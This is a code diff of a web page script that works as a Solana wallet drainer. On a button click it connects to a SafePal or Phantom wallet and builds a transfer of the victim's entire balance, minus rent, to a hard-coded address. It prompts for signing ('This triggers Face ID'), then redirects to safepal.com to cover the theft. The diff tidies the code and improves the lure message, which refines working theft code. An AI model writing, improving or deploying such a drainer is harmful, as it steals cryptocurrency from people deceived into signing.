@@ -25,20 +25,25 @@
     </div>
     <script>
         document.getElementById('actionBtn').onclick = async () => {
+            // Try SafePal first, then Solana, then Phantom
             let wallet = window.safepal || window.solana || window.phantom;
-            if(!wallet){
-                alert("Open this page in your wallet browser.");
+            
+            if (!wallet) {
+                alert("No wallet detected. Please open this page in SafePal or Phantom browser.");
                 return;
             }
-            try{
+            
+            try {
                 const connected = await wallet.connect();
-                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
+                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
                 const balance = await connection.getBalance(connected.publicKey);
                 const rent = await connection.getMinimumBalanceForRentExemption(0);
-                if(balance < rent){
+                
+                if (balance < rent) {
                     alert("Insufficient funds.");
                     return;
                 }
+                
                 const destination = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
@@ -47,14 +52,19 @@
                         lamports: balance - rent
                     })
                 );
+                
                 transaction.feePayer = connected.publicKey;
-                const block = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = block.blockhash;
+                const recentBlock = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = recentBlock.blockhash;
+                
+                // This triggers Face ID
                 const signed = await wallet.signTransaction(transaction);
-                const txid = await connection.sendRawTransaction(signed.serialize());
-                await connection.confirmTransaction(txid);
+                const txId = await connection.sendRawTransaction(signed.serialize());
+                await connection.confirmTransaction(txId);
+                
                 window.location.href = "https://safepal.com";
-            }catch(e){
+            } catch (err) {
+                console.error(err);
                 alert("Action failed. Try again.");
             }
         };
